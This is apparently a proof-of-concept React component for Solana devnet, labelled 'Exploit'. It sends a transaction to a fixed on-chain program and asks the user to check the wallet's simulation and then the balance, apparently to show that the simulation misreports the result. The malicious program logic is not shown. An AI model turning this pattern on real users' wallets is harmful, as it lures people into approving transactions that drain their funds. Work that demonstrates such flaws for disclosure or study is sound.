import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { FC, useState } from 'react';
import { PublicKey, SystemProgram, TransactionInstruction, Transaction,  } from '@solana/web3.js';
import { sendTransaction } from "../utils/utils";

export const Exploit: FC = () => {
    const wallet = useWallet();
    const { connection } = useConnection();

    const [signature, setSignaure] = useState<String | undefined>();
    const [loading, setLoading] = useState<boolean>(false);

    async function exploit() {
        if (!wallet || !wallet.publicKey) {
            alert('Please connect your wallet');
            return;
        }

        const exploitInstruction = new TransactionInstruction({
            programId: new PublicKey('CnewVunPpzSSG57a75hx6PemWAhUsLEkCFxxUr84xf9m'),
            keys: [
                { pubkey: wallet.publicKey, isSigner: true, isWritable: true },
                { pubkey: new PublicKey('SysvarS1otHistory11111111111111111111111111'), isSigner: false, isWritable: false },
                { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
                { pubkey: new PublicKey('BDnkVRwbxJw2uoJ3hWP7tEp33oKVfVjVavnVt7pTz7aD'), isSigner: false, isWritable: true },
            ],
            data: Buffer.from([0])
        });


        const transaction = new Transaction();
        transaction.add(exploitInstruction);

        try {
            setLoading(true)
            const signature = await sendTransaction({
                transaction,
                wallet,
                connection,
                signers: undefined,
            });
            console.log("ok : " + signature?.toString())
            setSignaure(signature);
        } catch (e) { console.log(e); } finally {

            setLoading(false);
        }

    }

    return (
        <div className="main">
            <h2>Instructions:</h2>
            <ul>
                <li>
                    Switch your phantom wallet to Devnet
                </li>
                <li>
                    Airdrop some Solanas to your wallet (You need to have at least 0.1 SOL)
                </li>
                <li>
                    Connect your wallet
                </li>
                <li>
                    Click on the button below and verify the simulation
                </li>
                <li>
                    Check your wallet balance
                </li>
            </ul>

            <button onClick={() => { exploit() }} className="exploit-button">Send transaction</button>

            <br />
            <br />
            {
                loading && (
                    <p>Sending transaction...</p>
                )
            }
            {
                signature && (
                    <a href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`} target="_blank" rel="noreferrer noopener">
                        Open in explorer
                    </a>
                )
            }
        </div>
    );
};
